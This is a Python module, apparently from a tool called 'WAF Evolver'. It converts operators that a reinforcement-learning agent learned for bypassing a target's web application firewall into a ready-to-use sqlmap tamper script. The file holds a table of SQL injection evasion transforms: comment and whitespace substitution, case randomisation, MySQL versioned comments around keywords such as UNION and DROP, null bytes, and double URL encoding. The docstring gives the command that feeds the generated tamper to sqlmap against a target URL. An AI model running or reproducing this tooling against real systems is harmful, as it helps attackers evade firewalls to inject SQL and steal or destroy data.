"""
tamper_export.py
Turns the operators the RL agent found effective against a target into a
self-contained sqlmap tamper script. This is the bridge that lets you take a
learned WAF bypass and feed it straight into sqlmap:

    cp waf_bypass_tamper.py <sqlmap>/tamper/
    sqlmap -u "http://target/..." --tamper=waf_bypass_tamper

Only operators with a clean, deterministic SQL-tamper analog are exported.
"""
from pathlib import Path

TAMPER_SNIPPETS = {
    "add_sql_comment":        'retVal = retVal.replace(" ", "/**/")',
    "sql_inline_comment_split": 'retVal = retVal.replace(" ", "/**/")',
    "whitespace_alt":         'retVal = retVal.replace(" ", "%09")',
    "add_whitespace_variants": 'retVal = retVal.replace(" ", "%0b")',
    "case_randomize":         'retVal = "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(retVal))',
    "mysql_versioned_comment": 'retVal = re.sub(r"\\b(UNION|SELECT|FROM|WHERE|OR|AND|INSERT|DROP|TABLE)\\b", lambda m: "/*!50000" + m.group(1) + "*/", retVal, flags=re.IGNORECASE)',
    "add_null_byte":          'retVal = retVal + "%00"',
    "url_encode_partial":     'retVal = retVal.replace(" ", "%20")',
    "double_url_encode":      'retVal = quote(quote(retVal, safe=""), safe="")',
    "strip_and_reencode":     'retVal = quote(unquote(retVal), safe="")',
}

_HEADER = '''"""
sqlmap tamper script generated by WAF Evolver.
Applies the mutation operators that were learned to bypass the target's WAF.
Operators (in order): {ops}
Detected WAF: {waf}
"""
import re
from urllib.parse import quote, unquote

try:
    from lib.core.enums import PRIORITY
    __priority__ = PRIORITY.NORMAL
except Exception:
    __priority__ = None


def dependencies():
    pass


def tamper(payload, **kwargs):
    retVal = payload
    if payload:
{body}
    return retVal
'''


def export_sqlmap_tamper(agent, out_path: str, detected_waf: str = "unknown", top_n: int = 6) -> str:
    """Build a tamper from the agent's top positive-value operators that have
    a deterministic SQL analog. Returns the path written, or "" if nothing
    exportable was learned."""
    if agent is None:
        return ""
    ranked = agent.top_operators(n=50)
    chosen = [name for name, q in ranked if q > 0 and name in TAMPER_SNIPPETS][:top_n]
    if not chosen:
        return ""

    body_lines = []
    for name in chosen:
        body_lines.append(f"        # {name}")
        body_lines.append(f"        {TAMPER_SNIPPETS[name]}")
    body = "\n".join(body_lines)

    content = _HEADER.format(ops=", ".join(chosen), waf=detected_waf, body=body)
    Path(out_path).parent.mkdir(parents=True, exist_ok=True)
    Path(out_path).write_text(content)
    return out_path
